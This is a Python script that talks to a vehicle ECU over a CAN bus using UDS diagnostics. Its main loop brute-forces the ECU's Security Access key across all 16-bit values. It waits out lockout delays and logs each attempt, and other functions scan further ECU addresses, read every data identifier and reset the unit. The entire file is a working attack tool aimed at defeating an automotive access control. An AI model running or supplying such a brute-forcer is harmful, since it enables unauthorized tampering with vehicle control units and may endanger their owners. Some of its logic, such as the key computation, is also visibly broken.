#!/usr/bin/env python3

import can
import sys
from time import sleep, ctime

INTERFACE="can0"

EXTENDED_DIAGNOSTIC = 0x3
DIAGNOSTIC_SESSION = 0x10
SECURITY_SESSION = 0x27

GENERAL_REJECT = 0x10
BUSY_REPEAT_REQUEST = 0x21
SECU_SESSION_BAD_KEY = 0x35
SECU_SESSION_EXCEED_NUMBER = 0x36
SECU_SESSION_DELAY_NOT_EXPIRED = 0x37

IGNORE_KEY = -1
REQUEST_SEED = 0x1
SEND_KEY = 0x2
VW_REQUEST_SEED = 0x3 # Different levels of security defined by the manufacturer.
VW_SEND_KEY = 0x4     # See Keyword Protocol 2000 - Part 3 (Implementation)

ACTION_BOTH=1
ACTION_SEED=2
ACTION_KEY=3

g_seed=[]

def _is_answer(answer, data):
    '''
    Check if the message received answers our query
    '''
    if len(answer.data) < 3:
        return False

    if (answer.data[1] != data[1] + 0x40) and (answer.data[1] != 0x7f):
        # REQUEST MODE
        return False
    if (answer.data[2] != data[2]) and (answer.data[2] != data[1]):
        # REQUEST PID
        return False

    return True

def can_xchg(bus, arb_id, data, ext=False):
    '''
    Noise proof
    '''
    msg = can.Message(arbitration_id=arb_id,
            data=data,
            extended_id=ext)

    answer = None
    bus.send(msg)
    while not answer or not _is_answer(answer, data):
        # 29bits CAN requires to resend the message until
        # the answer is received.
        try:
            answer = bus.recv(0.05)
        except:
            pass

    return answer

def uds_init_diagnostic_session(bus, arb_id, session_type=EXTENDED_DIAGNOSTIC):
    answer = can_xchg(bus, arb_id, [2, DIAGNOSTIC_SESSION, session_type, 0, 0, 0, 0, 0])

    if answer and answer.data[1] == (DIAGNOSTIC_SESSION + 0x40):
        print("Diagnostic session susccessfuly opened")
        pass
    else:
        print("Failure in establishing ISO-TP diagnostic session")
        return None

    return answer

def compute_key(seed):
    return seed

def _uds_init_security_session_error(code):
    if code == SECU_SESSION_BAD_KEY:
        print("Bad key in security session init")
    elif code == SECU_SESSION_EXCEED_NUMBER:
        print("ExceedNumberOfAttempts in security session init")
    elif code == SECU_SESSION_DELAY_NOT_EXPIRED:
        print("requiredTimeDelayNotExpired in security session init")
    elif code == BUSY_REPEAT_REQUEST:
        print("BUSY_REPEAT_REQUEST - sleeping")
        sleep(0.3)
    elif code == 0x22:
        print("ConditionNotCorrect in security session init")
    else:
        #print("Failure in sending security session key")
        pass

    return code


def uds_init_security_session(bus, arb_id, req_seed=REQUEST_SEED, send_key=SEND_KEY, action=ACTION_BOTH, key=[], seed=[]):

    if action == ACTION_BOTH or action == ACTION_SEED:
        print("GET SEED... ", end="")
        answer = can_xchg(bus, arb_id, [2, SECURITY_SESSION, req_seed, 0, 0, 0, 0, 0])
        print("OK")

        if answer and answer.data[1] == (SECURITY_SESSION + 0x40):
            print(answer)
            global g_seed
            g_seed = list(answer.data[3:5])
            print("Security session seed: {0}".format(seed))
        else:
            return _uds_init_security_session_error(answer.data[3])
        key = compute_key(seed)

    if action == ACTION_BOTH or action == ACTION_KEY:
        data_key = [4, SECURITY_SESSION, send_key] + key
        print("SEND KEY... ", end="")
        answer = can_xchg(bus, arb_id, data_key)
        print("OK")

        with open('keylog', "a") as f:
            f.write("{0} {1} {2} {3}\n".format(ctime(), g_seed, key, "FAIL" if answer.data[1] != (SECURITY_SESSION + 0x40) else "WIN"))

        if answer and answer.data[1] == (SECURITY_SESSION + 0x40):
            print("Security session opened!")
            exit(0)
        else:
            return _uds_init_security_session_error(answer.data[3])

    return answer.data[3]

def uds_test_security_session(bus, key=SEND_KEY, arb_id=0x7e0):
    iteration_nb = 15

    while True:
        if uds_init_diagnostic_session(bus, arb_id, 0x85):
            if uds_init_security_session(bus, arb_id, VW_REQUEST_SEED, key):
                print("GO DUMP STUFF")
                return
            elif key != IGNORE_KEY:
                print("Failed key exchange - Sleeping")
                sleep(5)

        iteration_nb -= 1
        if iteration_nb == 0:
            return

def uds_test_other_ecus(bus):
    possible_ids = [0x0700, 0x0703, 0x0704, 0x0706, 0x0707, 0x0708, 0x070A,
                    0x0711, 0x0713, 0x0714, 0x0715, 0x0751, 0x076C, 0x07E0,
                    0x07F1]
    for arb_id in possible_ids:
        if uds_init_diagnostic_session(bus, arb_id):
            uds_test_security_session(bus, key=IGNORE_KEY, arb_id=arb_id)

def uds_test_readall(bus, arb_id=0x7e0):
    if uds_init_diagnostic_session(bus, arb_id):
        for high in range(0xff):
            for low in range(0xff):
                answer = can_xchg(bus, arb_id, [5, 0x22, high, low, 0x1, 0x1, 0, 0])
                sleep(0.05)



def uds_reset(bus, arb_id=0x7e0):
    uds_init_diagnostic_session(bus, arb_id, 0x85)
    sleep(0.5)
    answer = can_xchg(bus, arb_id, [0x2, 0x11, 0x1])
    print(answer)

#### MAIN ####

bus = can.interface.Bus(channel=INTERFACE, bustype='socketcan_native')
if len(sys.argv) < 2:
    x = 0
else:
    x = int(sys.argv[1])

#uds_test_other_ecus(bus)
#uds_test_readall(bus)

#for i in range(0, 0xff):
#	sleep(0.5)
#	uds_init_diagnostic_session(bus, 0x7e0, i)
    

## This ~works ##
uds_init_diagnostic_session(bus, 0x7e0, 0x85)
sleep(0.5)
error = uds_init_security_session(bus, 0x7e0, 1, 2, action=ACTION_SEED)
i = x
while i <= 0xffff:
    while uds_init_security_session(bus, 0x7e0, 1, 2, action=ACTION_SEED) == SECU_SESSION_DELAY_NOT_EXPIRED:
        sleep(0.5)
    if uds_init_security_session(bus, 0x7e0, 1, 2, action=ACTION_KEY, key=[(i >> 8) & 0xff, i & 0xff], seed=g_seed) == SECU_SESSION_BAD_KEY:
        print(i)
        i += 1
        continue
    sleep(5)
    print(ctime())
    uds_init_diagnostic_session(bus, 0x7e0, 0x85)

#uds_reset(bus)
